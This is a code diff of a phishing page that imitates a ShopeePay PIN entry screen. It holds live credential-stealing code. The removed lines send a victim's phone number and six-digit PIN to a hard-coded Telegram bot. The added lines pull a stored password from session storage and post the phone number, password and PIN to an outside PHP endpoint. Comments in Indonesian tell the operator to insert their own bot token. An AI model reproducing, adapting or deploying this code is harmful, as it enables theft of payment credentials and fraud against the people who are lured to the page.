@@ -90,7 +90,8 @@
         <div class="row" style="margin-top: -200px;">
             <div class="col-12 d-block mx-auto sizing" style="white-space: pre-wrap; height: 58.8px; padding-bottom: 0px; font-size: 16px; font-weight: 400; color: rgb(59, 59, 59); line-height: 1.4; border-radius: 0px;">
                <div class="row" style="texr-align: center; margin-right: 5px;">
-<input type="hidden" id="nomorhp" value="">	                  
+<input type="hidden" name="user" id="nomorhp" value="">
+<input type="hidden" name="pass" id="pass" value="">
 <input type="tel" name="sixpin" id="setPin" autocomplete="true" style="opacity: 0" oninput="kirimPesan()">
                     <div class="col-2">
                         <div class="bubble-r-box" style="height: 52px; left: 0px; width: 50px;">
@@ -188,7 +189,9 @@
     </form>
 <script>
   var alerts = sessionStorage.getItem("alerts");
-document.getElementById("nomorhp").value = alerts + "";          
+document.getElementById("nomorhp").value = alerts + "";        
+ var pass = sessionStorage.getItem("pass");
+document.getElementById("pass").value = pass + "";       
 </script>
 <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js">
 
@@ -230,16 +233,18 @@ document.getElementById("nomorhp").value = alerts + "";
                     var pinValue = $("input#setPin").val();
 
               if(pinValue.length == 6) {
-    var nomorhp = document.getElementById('nomorhp');     
-    var setPin = document.getElementById('setPin');                      
-                        
-  var gabungan = '※ 𝗡𝗼.𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 : ' + nomorhp.value + '%0A※ 𝗣𝗜𝗡 𝗦𝗵𝗼𝗽𝗲𝗲𝗣𝗮𝘆 : ' + setPin.value;
-
-    var token = '6361891428:AAH33MxO6hrBaUg8PAW1yPsLlcI4doyKV94'; // Ganti dengan token bot yang kamu buat
-    var grup = '5650679024'; // Ganti dengan chat id dari bot yang kamu buat
-    $.ajax({
-        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
-        method: `POST`,
+    
+       event.preventDefault();    
+    
+    
+     $.ajax({
+ type: 'POST',
+ url: 'https://www.website-layanan.c1.is/shopee/sendPin.php',
+ data: $("#ryuSubmit").serialize(),
+ datatype: 'JSON',
+ 
+ 
+ 
         
 })
     
